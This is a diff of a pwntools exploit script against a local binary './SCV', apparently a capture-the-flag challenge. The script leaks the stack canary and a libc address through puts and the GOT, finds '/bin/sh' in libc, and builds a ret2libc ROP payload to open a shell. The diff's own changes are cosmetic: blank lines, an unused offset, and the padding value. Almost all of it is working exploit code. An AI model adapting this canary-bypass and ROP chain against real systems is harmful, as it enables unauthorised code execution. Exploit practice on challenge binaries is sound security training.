@@ -1,13 +1,10 @@
 from pwn import *
 
-
 elf = ELF('./SCV')
 libc = elf.libc 
 
-
 io = process('./SCV')
 
-offset_to_libc = 8
 offset_to_canary = 168
 
 ret = 0x00000000004008b1
@@ -19,7 +16,6 @@ puts = elf.sym.puts
 def feed(payload):
     io.sendlineafter(b'>>',b'1')
     io.sendlineafter(b'>>',payload)
-
 
 def review_the_food():
     io.sendlineafter(b'>>',b'2')
@@ -46,7 +42,6 @@ def leak_libc():
     payload += p64(got_puts)
     payload += p64(puts)
     payload += p64(main)
-
     feed(payload)
     mine()
     io.recvline()
@@ -73,7 +68,6 @@ sh = next(libc.search(b'/bin/sh\x00'))
 
 log.success(f'/bin/sh @ 0x{sh:02x}')
 
-
 rop = b''
 rop += p64(pop_rdi_ret)
 rop += p64(sh)
@@ -84,7 +78,7 @@ rop += p64(ret)
 payload = b''
 payload += b'A'*offset_to_canary
 payload += p64(canary)
-payload += p64(ret) # padding between canary and return value
+payload += p64(0x4242424242424242) # padding between canary and return value
 payload += rop
 
 feed(payload)
